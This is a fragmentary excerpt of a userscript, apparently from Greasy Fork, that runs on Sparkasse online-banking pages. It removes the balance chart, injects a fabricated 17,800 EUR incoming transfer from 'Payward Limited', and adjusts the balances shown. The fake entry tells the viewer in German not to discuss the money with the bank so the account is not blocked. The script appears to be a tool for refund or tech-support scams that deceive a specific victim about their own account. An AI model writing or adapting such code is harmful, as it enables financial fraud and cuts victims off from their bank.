...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/480464/Combined%20Heiko%20Mohr.user.js
// @updateURL https://update.greasyfork.org/scripts/480464/Combined%20Heiko%20Mohr.meta.js
// ==/UserScript==
...
(function() {
    ...
    var buchungTextsZahl = "196.434";
    var accountsecurity = " 0718 29";
    ...
    if (window.location.href.indexOf("finanzuebersicht") > 0 || window.location.href.indexOf("10760089429") > 0 || window.location.href.indexOf("10740346043") > 0) {
...
if (KontosBoxElement) {
    ...
    if (window.location.href.indexOf("umsaetze") > 0 || window.location.href.indexOf("10760048047") > 0  ) {
...
if (saldoLinechartElement) {
    saldoLinechartElement.remove();
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 17.800,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">17.800</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">17.800,00 EUR</span></div></div></div></div></li>';
...
if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
    ...
    var adjustmentAmount = 17000.0; // The adjustment amount to use if "useSameAdjustmentAmount" is true
    var BALANCE_CONFIGS = [
